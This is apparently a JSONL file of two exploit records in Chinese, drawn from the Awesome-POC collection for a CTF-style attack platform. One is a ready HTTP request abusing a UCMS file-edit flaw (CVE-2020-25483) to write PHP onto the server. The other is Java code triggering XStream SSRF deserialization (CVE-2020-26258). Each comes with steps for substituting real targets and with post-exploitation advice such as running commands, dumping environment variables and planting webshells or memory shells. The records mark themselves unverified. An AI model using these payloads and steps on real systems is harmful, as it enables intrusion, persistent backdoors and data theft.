{"id": "awesome-poc:cve-2020-25483", "kind": "poc", "title": "UCMS 文件上传漏洞 CVE-2020-25483", "technique": "file-upload", "summary": "CMS漏洞 / CVE-2020-25483。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-25483 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["CMS漏洞", "CVE-2020-25483"], "payload_template": "POST /ucms/index.php?do=sadmin_fileedit&dir=/&file=1.php HTTP/1.1\n\nHost: ucms.com\n\nContent-Length: 58\n\nCache-Control: max-age=0\n\nUpgrade-Insecure-Requests: 1\n\nOrigin: http://ucms.com\n\nContent-Type: application/x-www-form-urlencoded\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 Edg/87.0.664.41\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\nReferer: http://ucms.com/ucms/index.php?do=sadmin_fileedit&dir=/&file=CNVD.php\n\nAccept-Encoding: gzip, deflate\n\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\n\nCookie: admin_213f42=admin; psw_213f42=0ef8fa2c997f64b78cde98b6c7c9cc0a; token_213f42=78012aac\n\nConnection: close\n\n\nuuu_token=78012aac&co=%3C%3Fphp+phpinfo%28%29%3F%3E&pos=17", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-25483 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["上传成功后先解决「路径未知」：从响应、源码或 `md5($file['name'])` 这类派生规则算出真实文件名（不是猜变体）。", "能执行就直接 `?c=id` 确认，再 `printenv` 与 `grep -rIl 'CTF{' /var/www /tmp`。", "不能执行就找包含点（LFI/模板包含）或改 Content-Type/后缀绕过，别反复重传同一个文件。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 CMS漏洞/UCMS 文件上传漏洞 CVE-2020-25483.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2020-26258", "kind": "poc", "title": "XStream SSRF 反序列化漏洞 CVE-2020-26258", "technique": "deserialization", "summary": "开发框架漏洞 / CVE-2020-26258。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-26258 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["开发框架漏洞", "CVE-2020-26258"], "payload_template": "import com.thoughtworks.xstream.XStream;\n\n/*\nCVE-2020-26258: A Server-Side Forgery Request can be activated unmarshalling\nwith XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host.\nAll versions until and including version 1.4.14\nhttps://x-stream.github.io/CVE-2020-26258.html\nSecurity framework of XStream not explicitly initialized, using predefined black list on your own risk.\n*/\n\npublic class CVE_2020_26258 {\n    public static void main(String[] args) {\n        String ssrf_xml = \"<map>\\n\" +\n                \"  <entry>\\n\" +\n                \"    <jdk.nashorn.internal.objects.NativeString>\\n\" +\n                \"      <flags>0</flags>\\n\" +\n                \"      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\\n\" +\n                \"        <dataHandler>\\n\" +\n                \"          <dataSource class='javax.activation.URLDataSource'>\\n\" +\n                \"            <url>http://{{target_url}}/internal/:</url>\\n\" +\n                \"          </dataSource>\\n\" +\n                \"          <transferFlavors/>\\n\" +\n                \"        </dataHandler>\\n\" +\n                \"        <dataLen>0</dataLen>\\n\" +\n                \"      </value>\\n\" +\n                \"    </jdk.nashorn.internal.objects.NativeString>\\n\" +\n                \"    <string>test</string>\\n\" +\n                \"  </entry>\\n\" +\n                \"</map>\";\n        XStream xstream = new XStream();\n        xstream.fromXML(ssrf_xml);\n    }\n}", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-26258 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["反序列化成功的第一件事是确认命令回显通道：DNS/HTTP 外带或直接 `id` 回显，两者都没有就先解决回显再谈 flag。", "有回显后立刻 `printenv`、`ls -la /`、`cat /flag*`；无反显则写文件到 webroot 再访问。", "命令执行不稳时改用文件写入（内存马/webshell），一次写入可反复使用，比每次都重建 gadget 链便宜。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 开发框架漏洞/XStream SSRF 反序列化漏洞 CVE-2020-26258.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
